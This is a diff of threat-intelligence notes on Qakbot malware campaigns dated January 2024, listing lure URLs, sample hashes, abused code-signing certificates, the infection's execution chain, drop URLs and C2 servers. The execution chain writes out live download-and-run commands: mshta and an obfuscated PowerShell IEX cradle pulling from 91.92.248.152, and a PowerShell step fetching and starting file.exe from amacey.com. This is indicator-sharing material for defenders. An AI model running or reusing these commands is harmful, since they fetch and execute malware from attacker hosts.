@@ -1,57 +1,54 @@
-25.01.2024 | Qakbot | bmw01 | Campaign 1706177816 | Version 500.486
+26.01.2024 | Qakbot | bmw01 | Campaign 2024-01-26T11:25:33 | Version 500.486
 
 *************************************************
 
-.url https://pastravaria-zavoi.ro/mmltvg/?1337
-.zip a06db85f05d21a67a3ae251a122a75adbd9046e33f0a2982924bff23e0d5a1d2  
-.msi a4d2138624f8eebbbd665597b1b9e7c3817c374e0e27327cf8acf1b5c57a4b10
-.exe 35ec4858f5f4f7c9c7cd27b9c48cfe3d8d4c03044974740f3fb0892bfe140a88
+.url https://sivasosb.org.tr/td4s/
+.zip 18785530de0c06d99d817d29d0785470ae108d05f7bc2db218b00d2185ae50af  
+.ps1 cc5fa220f92319e0e063e4e19c5e09b17e2e459ee33a0b763417080b1c4ecfed 
+.exe fda2abd24764809fb36d4d2ee7ab5f6e8c06381fe6d9bb191bde62411c96ba92
 
 *************************************************
 
 Code Signing Certificate
-Organisation:	Ken Friedman AB
+Organisation:	SOFTWARE MEDICAL DEVICES LIMITED
 Issuer:	SSL.com EV Code Signing Intermediate CA RSA R3
 Algorithm:	sha256WithRSAEncryption
-Valid from:	2023-12-26T17:58:18Z
-Valid to:	2024-12-25T17:58:18Z
-Serial number:	 44e737228040233fcd8ded2bf108ce8c
+Valid from:	2023-12-15T14:59:56Z
+Valid to:	2024-12-14T14:59:56Z
+Serial number:	 4a3f0bf26862263dac496033f50594cb
 Thumbprint Algorithm:	SHA256
-Thumbprint:	 d91b3734b2b549f587181526a2c03d484fdba23afc178adcaac1a2ce8a5e8909
+Thumbprint:	 04cd040132912db6eb2a24fce431eb9aab1828661fd87cef96e011d79f5d6082
+Source:	This information was brought to you by ReversingLabs A1000 Malware Analysis Platform
 
 *************************************************
 
 Exec >
 
-msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\Notesvb.msi
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Decrd.js
 
-msiexec.exe /V
+cmd.exe /c cd C:\Users\Admin\AppData\Local\Temp&&mshta http://91.92.248.152/z
 
-MsiExec.exe -Embedding B6D25A5BFEA47467B367C2A50167FD7B U
+mshta  http://91.92.248.152/z
 
-srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+powershell.exe" $c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''http://91.92.248.152/z/a.png'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
 
-C:\Windows\syswow64\MsiExec.exe -Embedding 52DE4ABE5AB6EEC6ED2566C24913AC1E
-
-rundll32.exe "C:\Windows\Installer\MSIA524.tmp",zzzzInvokeManagedCustomActionOutOfProc SfxCA_240690593 2 WixSharp!WixSharp.ManagedProjectActions.WixSharp_InitRuntime_Action
-
-rundll32.exe "C:\Windows\Installer\MSIAB7F.tmp",zzzzInvokeManagedCustomActionOutOfProc SfxCA_240692187 11 tiho_exe.cs!CustomActions.DownloadAndExecute
-
-rundll32.exe "C:\Windows\Installer\MSIB7C5.tmp",zzzzInvokeManagedCustomActionOutOfProc SfxCA_240695421 18 WixSharp!WixSharp.ManagedProjectActions.CancelRequestHandler
-
-vssvc.exe
+$url = "https://amacey.com/x1g/sdfr"
+$file = $env:appdata + "\\file.exe"
+invoke-webrequest "https://amacey.com/x1g/sdfr" -outfile $file
+start-process "$env:APPDATA\\file.exe"
 
 *************************************************
 
 drop urls:
 
-https://kitronits.com/4P6Hw2Q/2911b55afd0e411bb8245fd1d1462d44
+https://amacey.com/x1g/sdfr
 
 *************************************************
 
 c2's
 
+https://116.202.110.87/teorema505
 https://146.70.158.28:6882/teorema505
 https://185.117.90.142:6882/teorema505
-https://185.156.172.62:443/teorema505
-https://188.116.26.246:2222/teorema505
+https://185.156.172.62/teorema505
+https://77.73.39.175:32103/teorema505
